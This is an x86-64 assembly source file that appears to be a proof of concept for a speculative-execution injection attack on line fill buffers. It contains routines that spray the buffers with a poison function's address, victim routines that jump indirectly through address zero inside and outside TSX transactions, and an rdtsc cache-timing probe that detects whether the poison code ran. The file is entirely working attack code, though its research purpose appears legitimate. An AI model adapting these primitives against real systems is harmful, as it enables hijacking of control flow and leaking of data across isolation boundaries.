    .code

;
; SprayFillBuffers
; RCX = Address of the buffer containing the address of the target, poison, function.
;
SprayFillBuffers PROC
    mfence
    clflush         [rcx + 0 * 64]
    clflush         [rcx + 1 * 64]
    clflush         [rcx + 2 * 64]
    clflush         [rcx + 3 * 64]
    clflush         [rcx + 4 * 64]
    clflush         [rcx + 5 * 64]
    clflush         [rcx + 6 * 64]
    clflush         [rcx + 7 * 64]
    clflush         [rcx + 8 * 64]
    clflush         [rcx + 9 * 64]
    clflush         [rcx + 10 * 64]
    clflush         [rcx + 11 * 64]
    clflush         [rcx + 12 * 64]
    clflush         [rcx + 13 * 64]
    clflush         [rcx + 14 * 64]
    clflush         [rcx + 15 * 64]
    mfence
    mov             rax, [rcx + 0 * 64]
    mov             rax, [rcx + 1 * 64]
    mov             rax, [rcx + 2 * 64]
    mov             rax, [rcx + 3 * 64]
    mov             rax, [rcx + 4 * 64]
    mov             rax, [rcx + 5 * 64]
    mov             rax, [rcx + 6 * 64]
    mov             rax, [rcx + 7 * 64]
    mov             rax, [rcx + 8 * 64]
    mov             rax, [rcx + 9 * 64]
    mov             rax, [rcx + 10 * 64]
    mov             rax, [rcx + 11 * 64]
    mov             rax, [rcx + 12 * 64]
    mov             rax, [rcx + 13 * 64]
    mov             rax, [rcx + 14 * 64]
    mov             rax, [rcx + 15 * 64]
    mfence
    ret
SprayFillBuffers ENDP


;
; PoisonFunction - we'll spray the LFBs with the address of this function. Many times, when an indirect
; branch through memory triggers an assist or a fault, the CPU would forward this address to be used
; as a destination for the indirect branch.
;
    mfence                                  ; Just to make sure someone doesn't get here speculatively...
PoisonFunction PROC
    mov             rcx, 0BDBD0000h         ; Address which is used to check whether this executed or not. 
    mov             rax, [rcx]              ; Access it, so it gets cached - this way we'll now this got executed.
    mfence
    ret
PoisonFunction ENDP


;
; VictimFunctionTsx - jump to [0] inside a transaction. Many times the CPU would read stale data from the LFB
; and it would branch to those addresses.
;
VictimFunctionTsx PROC
    mfence
    xbegin      __abort_tsx
    mov         rax, 0000000000000000h      ; [1]
    jmp         qword ptr [rax]             ; [2]
    xend
__abort_tsx:
    mfence
    ret
VictimFunctionTsx ENDP


;
; VictimFunctionFault - jump to [0] outside a transaction. Many times the CPU would read stale data from the LFB
; and it would branch to those addresses.
;
VictimFunctionFault PROC
    mfence
    mov         rax, 0000000000000000h      ; Load 0 in RAX.
    jmp         qword ptr [rax]             ; Normally this will branch to whatever is in the LFBs.
    mfence
    ret
VictimFunctionFault ENDP


;
; MeasureAccessTime
;
MeasureAccessTime PROC
    mfence

    rdtsc
    shl         rdx, 32
    or          rdx, rax
    mov         r8, rdx

    lfence
    mov         al, [rcx]
    lfence

    rdtsc
    shl         rdx, 32
    or          rax, rdx
    sub         rax, r8

    mfence
    clflush     [rcx]
    mfence

    ret
MeasureAccessTime ENDP

    END
